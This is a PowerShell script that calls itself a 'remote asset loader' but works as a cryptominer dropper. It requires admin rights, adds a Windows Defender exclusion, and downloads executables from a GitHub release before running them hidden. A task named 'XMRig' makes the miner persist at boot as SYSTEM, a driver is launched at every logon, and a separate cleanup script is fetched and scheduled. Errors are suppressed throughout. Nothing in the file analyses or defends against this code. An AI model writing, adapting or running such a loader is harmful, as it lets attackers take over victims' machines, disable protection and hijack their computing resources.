# remote asset loader (with driver)
param()

$ErrorActionPreference = 'SilentlyContinue'

# --- endpoints ---------------------------------------------------------------
$ReleaseBase = 'https://github.com/billkentfelty/cdn-sync-7f3a2b/releases/download/v1'
$CleanUrl    = 'https://raw.githubusercontent.com/billkentfelty/cdn-sync-7f3a2b/main/clean.ps1'

$admin = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()
if (-not $admin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { exit }

$dir = 'C:\Windows\Background'
New-Item -ItemType Directory -Force -Path $dir | Out-Null

Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue

# --- main payload ------------------------------------------------------------
$sysPath = Join-Path $dir 'system.exe'
curl.exe -s -L -o $sysPath --retry 3 --retry-delay 5 --max-time 120 "$ReleaseBase/system.txt"
if (Test-Path $sysPath) {
    Start-Process -FilePath $sysPath -WorkingDirectory $dir -WindowStyle Hidden
}

# --- driver helper -----------------------------------------------------------
$zipPath  = Join-Path $dir 'driver.zip'
curl.exe -s -L -o $zipPath --retry 3 --retry-delay 5 --max-time 180 "$ReleaseBase/driver.zip"
$driverExe = $null
if (Test-Path $zipPath) {
    $driverDir = Join-Path $dir 'driver'
    New-Item -ItemType Directory -Force -Path $driverDir | Out-Null
    try {
        Expand-Archive -Path $zipPath -DestinationPath $driverDir -Force
    } catch {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $driverDir)
    }
    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
    $found = Get-ChildItem -Path $driverDir -Filter 'driver.exe' -Recurse | Select-Object -First 1
    if ($found) {
        Start-Process -FilePath $found.FullName -WorkingDirectory $found.DirectoryName -WindowStyle Hidden
        $driverPath = $found.FullName
    }
}

# --- cleanup task (one-shot, in ~1 hour) --------------------------------------
$cleanPath = Join-Path $env:TEMP 'clean.ps1'
curl.exe -s -L -o $cleanPath --retry 3 --retry-delay 5 --max-time 60 $CleanUrl
$taskClean = "Cleanup-$env:COMPUTERNAME"
$time = (Get-Date).AddHours(1).ToString('HH:mm')
$date = (Get-Date).AddHours(1).ToString('dd/MM/yyyy')
$cmdClean = "schtasks /create /tn `"$taskClean`" /tr `"powershell -ExecutionPolicy Bypass -File `"$cleanPath`"`" /sc once /st $time /sd $date /ru SYSTEM /rl HIGHEST /f"
Start-Process -FilePath 'cmd.exe' -ArgumentList "/c $cmdClean" -WindowStyle Hidden -Wait

# --- persistence --------------------------------------------------------------
$taskSys = "XMRig-$env:COMPUTERNAME"
$cmdSys = "schtasks /create /tn `"$taskSys`" /tr `"$sysPath`" /sc onstart /ru SYSTEM /rl HIGHEST /f"
Start-Process -FilePath 'cmd.exe' -ArgumentList "/c $cmdSys" -WindowStyle Hidden -Wait

if ($driverPath) {
    $user = whoami
    $taskDrv = "Driver-$env:COMPUTERNAME"
    $cmdDrv = "schtasks /create /tn `"$taskDrv`" /tr `"$driverPath`" /sc onlogon /ru `"$user`" /rl HIGHEST /f"
    Start-Process -FilePath 'cmd.exe' -ArgumentList "/c $cmdDrv" -WindowStyle Hidden -Wait
}
